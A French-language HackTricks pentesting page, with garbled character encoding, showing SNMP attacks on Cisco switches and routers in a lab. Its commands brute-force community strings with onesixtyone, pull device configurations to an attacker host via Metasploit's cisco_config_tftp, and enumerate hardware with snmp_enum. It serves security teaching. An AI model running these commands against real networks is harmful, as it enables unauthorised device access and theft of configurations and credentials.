# Cisco SNMP

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une entreprise de cybersÃ©curitÃ© ? Voulez-vous voir votre entreprise annoncÃ©e dans HackTricks ? ou voulez-vous avoir accÃ¨s Ã  la derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [repo hacktricks](https://github.com/carlospolop/hacktricks) et au [repo hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

Cette page a Ã©tÃ© copiÃ©e depuis [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

## Exfiltration de configuration et Ã©numÃ©ration via SNMP <a href="#e21c" id="e21c"></a>

**SNMP (Simple Network Management Protocol)** est un protocole qui vous permet de surveiller l'Ã©tat des pÃ©riphÃ©riques sur un rÃ©seau informatique. Il peut s'agir d'Ã©quipements rÃ©seau, de tÃ©lÃ©phones IP, de serveurs d'entreprise ou de tout autre Ã©lÃ©ment.

**SNMP utilise le protocole de couche de transport UDP avec les numÃ©ros de port 161/UDP et 162/UDP.** Des chaÃ®nes de communautÃ© sont utilisÃ©es pour faire rÃ©fÃ©rence aux agents SNMP sur le serveur. Ce sont, pour ainsi dire, des mots de passe spÃ©ciaux pour communiquer avec le serveur SNMP. **Les chaÃ®nes de communautÃ© ont des autorisations soit en lecture seule (RO), soit en lecture-Ã©criture (RW).**

**En fait, SNMP peut non seulement surveiller l'Ã©tat de l'Ã©quipement, mais aussi le gÃ©rer entiÃ¨rement : extraire des configurations, modifier la configuration, etc.** Si un testeur de pÃ©nÃ©tration peut rechercher la valeur des chaÃ®nes de communautÃ©, il accÃ¨de en fait Ã  l'Ã©quipement. **Cependant, tout dÃ©pend de la chaÃ®ne qu'il a bruteforcÃ©e - la chaÃ®ne de communautÃ© RO ou RW.**

**La force brute des chaÃ®nes de communautÃ© peut Ãªtre mise en Å“uvre Ã  l'aide de l'utilitaire** [**onesixtyone**](https://github.com/trailofbits/onesixtyone). **Il prendra en entrÃ©e le dictionnaire pour la force brute et les adresses IP des hÃ´tes cibles. Les cibles seront :**

* **10.10.100.10 - Commutateur Cisco vIOS**
* **10.10.100.254 - Routeur Cisco vIOS**
```
~$ onesixtyone -c communitystrings -i targets
```
Nous avons dÃ©couvert quelles chaÃ®nes de communautÃ© sont utilisÃ©es sur ces appareils. Cela ouvre la voie Ã  l'exploitation.

### 8.1 cisco\_config\_tftp <a href="#1dbf" id="1dbf"></a>

Avec le framework Metasploit, notamment le module **cisco\_config\_tftp**, vous pouvez extraire la configuration de l'appareil en connaissant la valeur de la chaÃ®ne de communautÃ©. La chaÃ®ne qui a les droits en lecture-Ã©criture est **private**.

Nous aurons besoin des Ã©lÃ©ments suivants :

* **ChaÃ®ne de communautÃ© en lecture-Ã©criture (COMMUNITY)**
* **Adresse IP de l'attaquant (LHOST)**
* **Adresse IP de l'Ã©quipement cible (RHOSTS)**
* **Le chemin dans lequel le module sort la configuration de l'appareil (OUTPUTDIR)**
```bash
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set COMMUNITY private
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set LHOST 10.10.100.50
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > set OUTPUTDIR /home/necreas1ng/snmp
msf6 auxiliary(scanner/snmp/cisco_config_tftp) > exploit
```
AprÃ¨s avoir dÃ©marrÃ© le module, la configuration de l'hÃ´te avec l'adresse 10.10.100.10 (10.10.100.10.txt) sera tÃ©lÃ©chargÃ©e dans le dossier spÃ©cifiÃ©.

![](<../../.gitbook/assets/image (223).png>)

### 8.2 snmp\_enum <a href="#3429" id="3429"></a>

Avec ce module, vous pouvez dÃ©couvrir des informations sur le matÃ©riel cible. Tout est exactement pareil : spÃ©cifiez **COMMUNITY** (d'ailleurs, mÃªme une chaÃ®ne avec des **permissions RO** fera l'affaire) et l'adresse IP de l'appareil cible.
```bash
msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 10.10.100.10
msf6 auxiliary(scanner/snmp/snmp_enum) > exploit
```
<figure><img src="../../.gitbook/assets/image (218).png" alt=""><figcaption></figcaption></figure>

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybersÃ©curitÃ©** ? Voulez-vous voir votre **entreprise annoncÃ©e dans HackTricks** ? ou voulez-vous avoir accÃ¨s Ã  la **derniÃ¨re version de PEASS ou tÃ©lÃ©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* DÃ©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) **groupe Discord** ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au [dÃ©pÃ´t hacktricks](https://github.com/carlospolop/hacktricks) et au [dÃ©pÃ´t hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
